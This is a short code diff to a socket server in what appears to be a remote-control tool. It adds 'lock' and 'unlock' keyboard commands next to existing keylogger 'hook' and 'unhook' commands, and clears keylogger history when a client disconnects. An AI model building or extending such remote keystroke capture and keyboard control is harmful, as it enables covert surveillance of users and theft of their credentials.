@@ -1,3 +1,4 @@
+import keyboard
 import app.core.protocol as protocol
 import app.server.packages.keyboard_manip as keyboard_manip
 import app.server.packages.machine_manip as machine_manip
@@ -74,6 +75,8 @@ class Service:
             self.client_socket.close()
             self.client_socket = None
             logging.debug('Closed client socket')
+        keyboard_manip.keylogger.clear_history()
+        keyboard_manip.keylogger.unlock()
         logging.debug('Stopped client connection')
 
     def serve(self):
@@ -185,6 +188,10 @@ class Service:
             keyboard_manip.keylogger.hook()
         elif option == 'unhook':
             data = keyboard_manip.keylogger.unhook()
+        elif option == 'lock':
+            keyboard_manip.keylogger.lock()
+        elif option == 'unlock':
+            keyboard_manip.keylogger.unlock()
         
         return protocol.Response(status_code, data.encode(protocol.MESSAGE_ENCODING))
 
